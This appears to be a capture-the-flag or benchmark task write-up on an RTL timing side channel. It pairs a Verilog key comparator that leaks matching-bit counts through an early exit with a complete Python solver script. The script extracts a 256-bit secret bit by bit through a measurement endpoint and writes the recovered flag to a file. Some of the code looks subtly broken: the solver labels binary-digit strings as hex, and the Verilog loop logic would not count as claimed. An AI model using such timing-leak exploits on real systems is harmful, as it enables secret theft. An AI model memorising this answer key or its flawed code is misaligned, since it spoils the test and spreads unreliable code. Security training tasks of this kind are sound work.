# Task 001: RTL Timing Side-Channel (Level 4 - Complete)

**Verilog Comparator:**
```verilog
always @(posedge clk) begin
    count <= 0;
    for (i = 0; i < 256; i++) begin
        if (secret_key[i] == input_key[i]) begin
            count <= count + 1;
        end else begin
            break;  // Early exit leaks timing
        end
    end
end
output timing = count;  // Number of matching bits
```

**Complete Python Exploit:**
```python
import requests

secret = 0
for bit_pos in range(256):
    guess_0_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [0] * (256-bit_pos)
    guess_1_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [1] + [0] * (255-bit_pos)
    
    guess_0_hex = '0x' + ''.join(str(b) for b in guess_0_bits)
    guess_1_hex = '0x' + ''.join(str(b) for b in guess_1_bits)
    
    timing_0 = requests.post('http://target:8000/measure', json={'guess': guess_0_hex}).json()['timing']
    timing_1 = requests.post('http://target:8000/measure', json={'guess': guess_1_hex}).json()['timing']
    
    if timing_1 > timing_0:
        secret |= (1 << (255 - bit_pos))

flag = f"FLAG{hex(secret)[2:].upper().zfill(64)}"
with open('/app/flags.txt', 'w') as f:
    f.write(flag)
```
